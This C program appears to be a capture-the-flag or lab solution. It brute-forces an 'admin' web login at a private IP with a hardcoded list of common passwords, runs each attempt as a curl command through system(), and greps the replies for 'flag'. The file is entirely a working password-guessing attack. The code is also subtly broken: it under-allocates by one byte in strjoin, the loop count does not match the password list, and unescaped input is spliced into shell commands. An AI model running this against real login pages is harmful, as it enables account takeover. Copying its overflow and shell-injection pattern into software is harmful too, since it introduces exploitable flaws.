#include <stdlib.h>
#include <string.h>
#include <stdio.h>

char *strjoin(char *s1, char *s2)
{
	char *s3;
	int i;

	s3 = malloc(strlen(s1) + strlen(s2));
	i = -1;
	while (++i < (strlen(s1) + strlen(s2)))
		s3[i] = (i < strlen(s1) ? s1[i] : s2[i - strlen(s1)]);
	s3[i] = 0;
	return (s3);
}

int main()
{
	char passwd[31][100] = {
	"123456",
	"password",
	"12345678",
	"qwerty",
	"123456789",
	"12345",
	"1234",
	"111111",
	"1234567",
	"dragon",
	"123123",
	"baseball",
	"abc123",
	"football",
	"monkey",
	"letmein",
	"696969",
	"shadow",
	"master",
	"666666",
	"qwertyuiop",
	"123321",
	"mustang",
	"1234567890",
	"michael",
	"654321",
	"pussy",
	"superman",
	"1qaz2wsx",
	"7777777",
	};
	int i;
	char *request;
	char *tmp;

	i = -1;
	while (++i < 31)
	{
		tmp = strjoin("curl -s \"http://192.168.56.101/index.php?page=signin&username=admin&password=", passwd[i]);
		request = strjoin(tmp, "&Login=Login#\" -s | grep -w flag");
		printf("%s\n", request);
		system(request);
	}
}
